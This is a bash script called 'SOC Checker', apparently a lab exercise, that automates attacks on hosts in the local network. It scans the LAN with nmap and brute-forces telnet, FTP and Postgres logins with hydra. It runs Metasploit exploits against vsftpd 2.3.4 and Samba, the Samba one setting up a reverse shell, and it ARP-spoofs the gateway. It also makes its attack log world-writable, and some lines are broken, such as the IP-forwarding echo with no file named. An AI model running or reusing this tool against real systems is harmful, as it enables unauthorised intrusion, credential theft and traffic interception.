#!/bin/bash
#######################################################################
# SOC Checker                                                         #
#######################################################################

### Identify the LAN network range ###
function scan_lan_network_range()
{
	# Use local IP Address to find network address (first three octets)
	LOCAL_IP_ADDRESS=$(ifconfig | grep broadcast | awk '{print $2}')
	NETWORK_ADDRESS=$(ifconfig | grep broadcast | awk '{print $2}' | awk -F'.' '{print $1 "." $2 "." $3}')
	
	# Find the network address range
	NETWORK_RANGE=$(netmask -r $LOCAL_IP_ADDRESS/24)
	
	# Print network range
	echo -e "Network range:            $NETWORK_RANGE"
	echo -e "Network Address:            $NETWORK_ADDRESS"
}

### Create folder to store results and logs ###
function create_log_folder()
{
	# Check if logs folder exist in current directory, create logs folder if it doesn't exist
	if [ ! -d "logs" ]
	then
		mkdir logs
	fi
}

### Scan current LAN for available devices ###
function scan_current_lan_network()
{
	# Scan for all devices on the current LAN
	nmap -sn $LOCAL_IP_ADDRESS/24 | grep -Eo 'Nmap scan report for ([0-9]{1,3}[\.]){3}[0-9]{1,3}' | awk '{print($NF)}' > logs/nmap_results.txt
}

### Filter out IP Addresses that are not assigned by DHCP server ###
function filter_non_dhcp_address()
{
	# Read back nmap results for all devices IP address found
	NMAP_RESULTS=$(cat logs/nmap_results.txt)
	
	# Filter Host, NAT, DHCP and local device IP Address
	echo "" > logs/hosts.txt
	for line in $NMAP_RESULTS
	do
		if [ $line != $NETWORK_ADDRESS.1 ] && [ $line != $NETWORK_ADDRESS.2 ] && [ $line != $NETWORK_ADDRESS.254 ] && [ $line != $LOCAL_IP_ADDRESS ]
		then
			echo -e "$line" >> logs/hosts.txt
		fi
	done
	
	# Print LAN HOSTs IP Address 
	local HOSTS=$(cat logs/hosts.txt |  tr -s '\n' ' ')
	echo "Host found in LAN Network: ${HOSTS}"
}

### Read IP Address from user ###
function read_ip_address()
{
	local CORRECT_IP=0
	local HOSTS=$(cat logs/hosts.txt)
	local HOSTS_COUNT=$(cat logs/hosts.txt | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | wc -l)
	
	# Ensure only IP Address on current LAN can be entered by user 
	while [ $CORRECT_IP == 0 ]
	do
		read -p "Enter an IP Address or type 'R' for random IP Address to target: " TARGET_IP
		
		# Select random IP address on current LAN to attack 
		if [ $TARGET_IP == 'R' ] ||  [ $TARGET_IP == 'r' ]
		then
			local RANDOM_IP_ADDRESS_INDEX=$(( $RANDOM % $HOSTS_COUNT + 1 ))
			local COUNT=1

			# Select IP address IP based on random number
			for line in $HOSTS
			do
				if [ $COUNT == $RANDOM_IP_ADDRESS_INDEX ]
				then
					TARGET_IP=$line
					echo "Target IP is ${TARGET_IP}"
					break
				fi
				COUNT=$((COUNT + 1))
			done
			CORRECT_IP=1
		fi

		# Check if IP address exist in LAN
		for line in $HOSTS
		do
			if [ $TARGET_IP == $line ]
			then
				CORRECT_IP=1
			fi
		done
		
		# Prompt user for new IP address selection if IP address is not found in LAN 
		if [ $CORRECT_IP == 0 ]
		then
			echo "Please reenter an IP Address that is in the Network Range."
		fi
	done
}

### Scan and enumerate the target host for open ports and services ###
function enumerate_host()
{
	echo "Enumerating target host..."
	sudo nmap -sV -O -p- $TARGET_IP -oA logs/$TARGET_IP > logs/enumerate_host.txt
	echo "Finish gathering info on target host"
}

### Print Open Ports and Services for target host ###
function read_enumerate_data()
{
	echo "****************************************************************************************"
	echo "* Open Ports and Services for Host:                                                    *"
	echo "****************************************************************************************"                                         
	ENUMERATE_HOST_RESULTS=$(cat logs/enumerate_host.txt | grep open)
	echo "${ENUMERATE_HOST_RESULTS}"
}

### Choose Attack types ###
function attack_vectors_menu()
{
	local VALID_ATTACK_VECTOR=0
	
	# Request users to select an attack vector or allow for a random choice
	while [ $VALID_ATTACK_VECTOR == 0 ]
	do
		echo "****************************************************************************************"
		echo "* Select Attack Vector                                                                 *"
		echo "****************************************************************************************" 
		echo "Choose attack vector from the list below:"
		echo "1) Brute force attack: A brute force attack is a hacking method that uses trial and error to crack passwords, login credentials, and encryption keys."
		echo "2) Exploit attack: Allow attackers to takes advantage of a software vulnerability or security flaw, to gain elevated privileges into the network."
		echo "3) ARP Spoofing: A Man in the Middle (MitM) attack that allows attackers to intercept communication between network devices."
		echo "4) Random choice from options 1-3"
		read -p "Enter attack vector selected from option 1-3: " ATTACK_VECTOR
		
		case $ATTACK_VECTOR in
		1)
			brute_force
			VALID_ATTACK_VECTOR=1
			break
		;;
		2)
			exploit
			VALID_ATTACK_VECTOR=1
			break
		;;
		3)
			arp_spoofing
			VALID_ATTACK_VECTOR=1
			break
		;;
		4)
			RANDOM_ATTACK_VECTOR=$(( $RANDOM % 3 + 1 ))
			
			if [ $RANDOM_ATTACK_VECTOR == 1 ]
			then
				brute_force
			elif [ $RANDOM_ATTACK_VECTOR == 2 ]
			then
				exploit
			elif [ $RANDOM_ATTACK_VECTOR == 3 ]
			then
				arp_spoofing
			fi
			VALID_ATTACK_VECTOR=1
			break
		;;
		*)
			echo "Please select options 1 to 4 only, exiting program..."
			VALID_ATTACK_VECTOR=0
			exit
		;;
		esac
	done
}

### Brute force attack ###
function brute_force()
{
	echo "****************************************************************************************"
	echo "* Brute force attack                                                                   *"
	echo "****************************************************************************************" 
	
	# Log the brute force attack 
	log_attack_events Brute_Force_Attack

	# Get the users list and passwords list from user 
	get_users_list
	get_passwords_list
	
	# Begin the brute force attack
	brute_force_login_service
}

### Exploit attack ###
function exploit()
{
	echo "****************************************************************************************"
	echo "* Exploit attack                                                                       *" 
	echo "****************************************************************************************" 
	
	# Log the exploit attack 
	log_attack_events Exploit_Attack
	
	# Check which services are available for exploit
	local VSFTPD_CHECK=$(cat logs/$TARGET_IP.nmap | grep "vsftpd 2.3.4" | grep open | grep 21/tcp | awk '{print $1}')
	local SAMBA_CHECK=$(cat logs/$TARGET_IP.nmap | grep "netbios-ssn" | grep open | grep 139/tcp | awk '{print $1}')
	
	# Select the exploit attack based on if else order
	if [ ! -z $VSFTPD_CHECK ]
	then
		if [ $VSFTPD_CHECK == "21/tcp" ]
		then
			vsftpd_exploit
		fi
	elif [ ! -z $SAMBA_CHECK  ]
	then
		if [ $SAMBA_CHECK == "139/tcp" ]
		then
			samba_exploit
		fi
	fi
}

### ARP Spoofing ###
function arp_spoofing()
{
	echo "****************************************************************************************"
	echo "* ARP Spoofing attack                                                                  *"
	echo "****************************************************************************************" 
	
	# Log the ARP Spoofing attack 
	log_attack_events ARP_Spoofing_Attack
	
	# Get gateway address
	GATEWAY=$(route | grep UG | awk '{print $2}')
	
	# Completed ARPspoofing
	echo "Begin ARP spoofing on Target IP ${TARGET_IP}"
	
	# Forward packets to attacker (local pc)
	sudo echo 1 > /proc/sys/net/ipv4/
	sleep 1
	
	# Inform the target IP that attacker IP is the gateway
	sudo arpspoof -i eth0 -t $TARGET_IP $GATEWAY
	sleep 1
	
	# Inform the gateway that attacker IP is the target IP
	sudo arpspoof -i eth0 -t $GATEWAY $TARGET_IP
	sleep 1
	
	# Completed ARPspoofing
	echo "ARP spoofing has ended."
}

### Ask user to enter a users list filename ###
function get_users_list()
{
	read -p "Enter users list: " USERS_LIST
	
	# Check if the users list file exist on current directory
	if [ ! -f "$USERS_LIST" ]
	then
		echo "This is not a file"
	fi	
}

### Ask user to enter a password list filename ###
function get_passwords_list()
{
	echo "" > passwords_list.txt
	
	read -p "Enter passwords list: " PASSWORDS_LIST
	
	# Check if the password list file exist on current directory
	if [ -f "$PASSWORDS_LIST" ]
	then
		cp $PASSWORDS_LIST passwords_list.txt
	else
		echo "This is not a valid filename."
	fi
}

### Choose the port to brute force using the configure file service_exploit.txt ###
function choose_login_service()
{
	SERVICE_EXPLOIT_LIST=$(cat service_exploit.txt | awk '{print $1}' | awk -F'/' '{print $1}')
	ENUMERATE_HOST_RESULT_PORT=$(cat logs/enumerate_host.txt | grep open | awk '{print $1}' | awk -F'/' '{print $1}')
	PORT_NUMBER=0
	
	# Select the port to exploit based on the order
	for SERVICE_EXPLOIT in $SERVICE_EXPLOIT_LIST
	do		
		for ENUMERATE_HOST in $ENUMERATE_HOST_RESULT_PORT
		do
			if [ "$SERVICE_EXPLOIT" == "$ENUMERATE_HOST" ]
			then
				PORT_NUMBER=$SERVICE_EXPLOIT
				break 2
			fi
		done
	done
}

### Brute force the selected port using hydra ###
function brute_force_login_service()
{
	choose_login_service
	
	SERVICE=$PORT_NUMBER
	
	echo "****************************************************************************************"
	echo "*           Found vulnerable service, attacking port number: $PORT_NUMBER              *"
	echo "****************************************************************************************"          
	
	# Brute force the selected port service
	case $SERVICE in
	1524)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP telnet -s 1524 -I -vV
	;;
	21)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP ftp -s 21 -I -vV
	;;
	2121)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP ftp -s 2121 -I -vV
	;;
	5432)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP postgres -s 5432 -I -vV
	;;
	23)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP telnet -s 23 -I -vV
	;;
	esac 
}

### Exploiting Server for VSTPD Vulnerability ###
function vsftpd_exploit()
{
	#metasploit automation of vsftpd exploitation
	echo "****************************************************************************************"
	echo "* VSFTPD Exploitation attack                                                           *"
	echo "****************************************************************************************" 
	msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor;
	set RHOSTS $TARGET_IP;
	run;
	exit;"
	sleep 5
	echo ""
	echo "Complete exploitation of VSTPD Vulnerability!"
}

### Exploiting Server for SAMBA Vulnerability ###
function samba_exploit()
{
	#metasploit automation of SAMBA exploitation
	echo "****************************************************************************************"
	echo "* SAMBA Exploitation attack                                                            *"
	echo "****************************************************************************************" 
	msfconsole -q -x " use exploit/multi/samba/usermap_script;
	set RHOSTS $TARGET_IP;
	set PAYLOAD payload/cmd/unix/reverse ;
	set LHOST $LOCAL_IP_ADDRESS;
	set LPORT 4444;
	run;
	exit;"
	sleep 5
	echo ""
	echo "Complete exploitation of SAMBA Vulnerability!"
}

### Create Log file in /var/log/, log file name is attack.log ###
function create_log_file()
{	
	if [ ! -f "var/log/attack.log" ]
	then
		sudo touch /var/log/attack.log
		
		sudo chmod 777 /var/log/attack.log
	fi
}

### Log events on attacks that are executed ###
### 1st variable ($1): Attack name ###
function log_attack_events()
{
	# Get current date based on UTC format
	local DATE=$(date -u)
	
	sudo echo -e "${DATE} $1 $TARGET_IP" >> /var/log/attack.log
}

create_log_file
scan_lan_network_range
create_log_folder
scan_current_lan_network
filter_non_dhcp_address
read_ip_address
enumerate_host
read_enumerate_data
attack_vectors_menu

